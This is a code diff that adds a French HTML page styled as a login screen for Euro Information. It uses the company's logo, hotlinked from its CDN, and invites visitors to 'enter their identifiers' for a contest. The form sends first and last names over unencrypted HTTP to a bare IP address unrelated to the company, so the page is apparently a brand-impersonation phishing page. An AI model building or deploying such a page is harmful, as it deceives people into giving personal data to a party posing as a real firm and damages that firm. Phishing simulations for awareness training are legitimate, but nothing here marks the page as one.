@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Euro Information — Connexion</title>
+<style>
+:root{
+  --bg:#f5f7fb;
+  --card:#ffffff;
+  --accent:#0055A4;
+  --muted:#6b7280;
+  --shadow: 0 8px 30px rgba(15,23,42,0.08);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+}
+html,body{height:100%}
+body{
+  margin:0;
+  background: linear-gradient(180deg,#eef5ff 0%, var(--bg) 60%);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:32px;
+}
+.card{
+  width:100%;
+  max-width:920px;
+  background:var(--card);
+  border-radius:14px;
+  box-shadow:var(--shadow);
+  display:grid;
+  grid-template-columns: 380px 1fr;
+  overflow:hidden;
+}
+.panel-brand{
+  padding:34px;
+  background:linear-gradient(180deg,#ffffff 0%, #f0f4fa 100%);
+  display:flex;
+  flex-direction:column;
+  gap:20px;
+  align-items:flex-start;
+  justify-content:flex-start;
+}
+.logo {
+  display:flex;
+  gap:12px;
+  align-items:center;
+}
+.logo img {
+  width:80px;
+  height:auto;
+}
+.brand-title { font-size:20px; font-weight:700; color:#0b3768; letter-spacing:0.2px; }
+.brand-sub { color:var(--muted); font-size:13px; margin-top:-2px;}
+.note{
+  margin-top:6px;
+  background:#fff8e6;
+  border-left:4px solid #ffd54d;
+  padding:10px 12px;
+  font-size:13px;
+  color:#8a6d00;
+  border-radius:6px;
+}
+.hero { margin-top:18px; font-size:13px; color:var(--muted); line-height:1.5; }
+
+.panel-form{ padding:34px 40px; }
+form { display:flex; flex-direction:column; gap:12px; max-width:420px; }
+label{font-size:13px;color:var(--muted)}
+input[type="text"], input[type="password"]{
+  border-radius:10px;
+  padding:12px 14px;
+  border:1px solid #e6eef9;
+  font-size:15px;
+  background: linear-gradient(180deg,#fbfcff, #fff);
+  width:100%;
+  box-sizing:border-box;
+}
+.muted { font-size:13px;color:var(--muted); }
+.cta{ margin-top:10px; display:flex; gap:10px; }
+.btn { padding:10px 14px; border-radius:10px; font-weight:700; border:0; cursor:pointer; }
+.btn-primary { background:var(--accent); color:#fff; }
+.btn-secondary { background:#f1f5f9; color:var(--muted); }
+
+.footer-note { margin-top:18px; font-size:13px; color:var(--muted); }
+.legal { margin-top:26px; font-size:12px; color:#9aa3b2; }
+
+@media (max-width:880px){
+  .card { grid-template-columns: 1fr; }
+  .panel-brand{align-items:center;text-align:center}
+  .panel-form{padding:26px}
+  form{margin:auto}
+}
+</style>
+</head>
+<body>
+<div class="card" role="region" aria-label="Euro Information login">
+  <div class="panel-brand">
+    <div class="logo">
+      <img src="https://cdnsi.e-i.com/INGR/sd/euro_information_2020/5.121.5/fr/images/css/env/logo_new.svg" alt="Euro Information">
+      <div>
+        <div class="brand-title">EURO INFORMATION</div>
+        <div class="brand-sub">Solutions & Services</div>
+      </div>
+    </div>
+
+    <div class="hero">
+      Formulaire de connexion sécurisé — participez au concours.
+    </div>
+
+    <div class="note">
+      Vos données seront transmises au serveur de participation.
+    </div>
+  </div>
+
+  <div class="panel-form">
+    <h2 style="margin:0 0 8px 0">Connexion</h2>
+    <p class="muted" style="margin-top:0;margin-bottom:12px">Entrez vos identifiants pour participer.</p>
+
+    <form action="http://64.226.119.233/participation" method="POST">
+      <label for="prenom">Prénom</label>
+      <input id="prenom" name="prenom" type="text" required>
+
+      <label for="nom">Nom</label>
+      <input id="nom" name="nom" type="text" required>
+
+      <div class="cta">
+        <button type="submit" class="btn btn-primary">Participer</button>
+      </div>
+
+      <div class="footer-note">
+        Euro Information Développement.
+      </div>
+    </form>
+
+    <div class="legal">
+      &copy; Euro Information - EPS.
+    </div>
+  </div>
+</div>
+</body>
+</html>
